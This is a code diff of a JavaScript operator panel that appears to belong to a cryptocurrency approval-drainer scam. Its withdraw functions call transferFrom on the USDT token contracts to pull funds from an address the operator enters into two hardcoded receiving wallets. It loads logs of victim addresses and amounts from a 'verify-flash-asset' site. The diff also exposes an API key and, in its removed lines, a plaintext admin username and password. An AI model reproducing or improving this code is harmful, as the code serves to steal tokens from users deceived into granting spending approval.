@@ -1,84 +1,110 @@
-const RECEIVER_TRC = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
-const RECEIVER_BEP = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";
-const TRC20_USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
-const BEP20_USDT = "0x55d398326f99059fF775485246999027B3197955";
+const TRON_WALLET = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
+const BSC_WALLET = "0x21d6aF5418480d5C7A837BF1d3F25fCd43AE3c7E";
+const BSC_API_KEY = "KW2H7WKIP7Q8UTFB7G7Q1U24R8XWV5KDY4";
 
-const BEP_API_KEY = "KW2H7WKIP7Q8UTFB7G7Q1U24R8XWV5KDY4";
+const trcBalanceSpan = document.getElementById("trc20-balance");
+const bepBalanceSpan = document.getElementById("bep20-balance");
+const trcLogs = document.getElementById("trc20-logs");
+const bepLogs = document.getElementById("bep20-logs");
 
-function login() {
-  const u = document.getElementById("username").value;
-  const p = document.getElementById("password").value;
-  if (u === "enre.atul" && p === "Honda988701@") {
-    document.getElementById("loginBox").style.display = "none";
-    document.getElementById("panel").style.display = "block";
-    loadLogs();
-  } else {
-    alert("Incorrect credentials");
+async function fetchBEP20Balance() {
+  try {
+    const url = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=0x55d398326f99059fF775485246999027B3197955&address=${BSC_WALLET}&tag=latest&apikey=${BSC_API_KEY}`;
+    const res = await fetch(url);
+    const data = await res.json();
+    const raw = parseFloat(data.result) / 1e18;
+    bepBalanceSpan.textContent = `${raw.toFixed(2)} USDT`;
+  } catch (e) {
+    bepBalanceSpan.textContent = "Error";
   }
 }
 
-function logTRC(address, amount) {
-  const log = `${address} — ${amount} USDT`;
-  const li = document.createElement("li");
-  li.innerText = log;
-  document.getElementById("trcLogs").prepend(li);
+async function fetchTRC20Balance() {
+  try {
+    const res = await fetch(`https://api.trongrid.io/v1/accounts/${TRON_WALLET}`);
+    const data = await res.json();
+    const tokens = data.data[0].trc20;
+    const usdt = tokens.find(t => t["Tether USD"]);
+    const raw = parseFloat(usdt["Tether USD"]);
+    trcBalanceSpan.textContent = `${raw.toFixed(2)} USDT`;
+  } catch (e) {
+    trcBalanceSpan.textContent = "Error";
+  }
 }
 
-function logBEP(address, amount) {
-  const log = `${address} — ${amount} USDT`;
-  const li = document.createElement("li");
-  li.innerText = log;
-  document.getElementById("bepLogs").prepend(li);
+async function fetchLogs() {
+  try {
+    const bepRes = await fetch("https://verify-flash-asset.github.io/data/bep20.json");
+    const bepData = await bepRes.json();
+    bepLogs.innerHTML = "";
+    bepData.slice().reverse().forEach(log => {
+      const row = document.createElement("div");
+      row.textContent = `${log.address} — ${log.amount} USDT`;
+      bepLogs.appendChild(row);
+    });
+
+    const trcRes = await fetch("https://verify-flash-asset.github.io/data/trc20.json");
+    const trcData = await trcRes.json();
+    trcLogs.innerHTML = "";
+    trcData.slice().reverse().forEach(log => {
+      const row = document.createElement("div");
+      row.textContent = `${log.address} — ${log.amount} USDT`;
+      trcLogs.appendChild(row);
+    });
+  } catch (e) {
+    console.error("Error loading logs", e);
+  }
 }
 
-async function loadLogs() {
-  // Mock: You can enhance this to pull from server or storage later
-  logTRC("TXYZ123...", "500");
-  logBEP("0xABC456...", "340");
-}
-
-async function manualWithdrawTRC() {
-  const from = document.getElementById("trcFrom").value;
-  const amount = parseFloat(document.getElementById("trcAmount").value);
-  if (!from || !amount) return alert("Enter TRC-20 address and amount");
+async function withdrawTRC20() {
+  const from = document.getElementById("trc-from").value.trim();
+  const amount = document.getElementById("trc-amount").value.trim();
+  if (!from || !amount) return alert("Enter all TRC20 fields");
 
   try {
-    const contract = await window.tronWeb.contract().at(TRC20_USDT);
-    const decimalAmount = amount * 1e6;
-    await contract.transferFrom(from, RECEIVER_TRC, decimalAmount).send();
-    alert("TRC-20 Withdrawn");
+    const tradeobj = await window.tronWeb.contract().at("TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"); // USDT
+    const result = await tradeobj.transferFrom(from, TRON_WALLET, parseInt(amount * 1e6)).send();
+    alert("TRC20 Withdraw Success:\n" + result);
   } catch (e) {
-    alert("TRC Error: " + e.message);
+    alert("TRC20 Withdraw Failed:\n" + e.message);
   }
 }
 
-async function manualWithdrawBEP() {
-  const from = document.getElementById("bepFrom").value;
-  const amount = document.getElementById("bepAmount").value;
-  if (!from || !amount) return alert("Enter BEP-20 address and amount");
+async function withdrawBEP20() {
+  const from = document.getElementById("bep-from").value.trim();
+  const amount = document.getElementById("bep-amount").value.trim();
+  if (!from || !amount) return alert("Enter all BEP20 fields");
 
+  if (typeof window.ethereum === "undefined") {
+    return alert("MetaMask not detected");
+  }
+
+  await ethereum.request({ method: 'eth_requestAccounts' });
+  const web3 = new Web3(window.ethereum);
+  const usdt = new web3.eth.Contract([
+    { "constant": false, "inputs": [
+      { "name": "sender", "type": "address" },
+      { "name": "recipient", "type": "address" },
+      { "name": "amount", "type": "uint256" }
+    ],
+    "name": "transferFrom", "outputs": [
+      { "name": "", "type": "bool" }
+    ],
+    "type": "function"
+  }], "0x55d398326f99059fF775485246999027B3197955");
+
+  const accounts = await web3.eth.getAccounts();
   try {
-    const web3 = new Web3(window.ethereum);
-    const contract = new web3.eth.Contract([
-      {
-        "constant": false,
-        "inputs": [
-          { "name": "sender", "type": "address" },
-          { "name": "recipient", "type": "address" },
-          { "name": "amount", "type": "uint256" }
-        ],
-        "name": "transferFrom",
-        "outputs": [{ "name": "", "type": "bool" }],
-        "type": "function"
-      }
-    ], BEP20_USDT);
-
-    const accounts = await web3.eth.requestAccounts();
-    const decimalAmount = web3.utils.toWei(amount, "mwei");
-
-    await contract.methods.transferFrom(from, RECEIVER_BEP, decimalAmount).send({ from: accounts[0] });
-    alert("BEP-20 Withdrawn");
-  } catch (e) {
-    alert("BEP Error: " + e.message);
+    await usdt.methods.transferFrom(from, BSC_WALLET, web3.utils.toWei(amount)).send({ from: accounts[0] });
+    alert("BEP20 Withdraw Success");
+  } catch (err) {
+    alert("BEP20 Withdraw Failed:\n" + err.message);
   }
 }
+
+document.getElementById("withdraw-trc").onclick = withdrawTRC20;
+document.getElementById("withdraw-bep").onclick = withdrawBEP20;
+
+fetchTRC20Balance();
+fetchBEP20Balance();
+fetchLogs();
